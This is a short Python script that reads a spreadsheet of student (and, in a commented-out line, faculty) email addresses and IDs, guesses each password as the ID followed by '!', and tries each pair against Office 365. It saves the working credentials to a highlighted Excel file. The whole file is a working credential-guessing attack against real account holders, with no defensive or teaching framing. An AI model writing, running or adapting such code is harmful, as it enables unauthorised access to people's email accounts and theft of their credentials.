from O365 import Connection, FluentInbox
import pandas as pd

def validEmailPass(Username,Password):
    '''Given a username and passord it tells if it was able to log in succesfully'''
    connect = Connection.login(Username,Password)
    inbox = FluentInbox()

    try:
        messages = inbox.search('').fetch(count=1)
        return True
    except Exception:
        return False


def readFile(File,Output,Email,Id):
    df = pd.read_excel(File)
    data = df.loc[:,[Email,Id]]
    username_hit = []
    password_hit = []

    username_miss = []
    password_miss = []

    for people in data.iterrows():
        us = people[1][Email]
        ps = people[1][Id]+"!"
        if validEmailPass(us,ps):
            username_hit.append(us)
            password_hit.append(ps)
            print("Hit \t" + us)
        else:
            username_miss.append(us)
            password_miss.append(ps)
            print("miss \t" + us)

    df_hit = pd.DataFrame({'Emails':username_hit,'Password':password_hit})
    df_miss = pd.DataFrame({'Emails':username_miss,'Passwords':password_miss})

    writer = pd.ExcelWriter(Output,engine='xlsxwriter')

    df_hit.to_excel(writer,index=False)
    df_miss.to_excel(writer,index=False,startrow=len(username_hit)+1,header=False)

    worksheet = writer.sheets['Sheet1']

    workbook = writer.book

    format1 = workbook.add_format({'fg_color':'#2ecc46'})

    for i in range(1,len(username_hit) + 1):
        worksheet.set_row(i,None,format1)

    writer.save()



def main():
    #readFile("landmark_faculty_directory.xlsx",'teachers.xlsx','Email Address','PEOPLE_CODE_ID')
    readFile("studentList.xlsx",'students.xlsx','Email','ID')

if __name__ == '__main__':
    main()
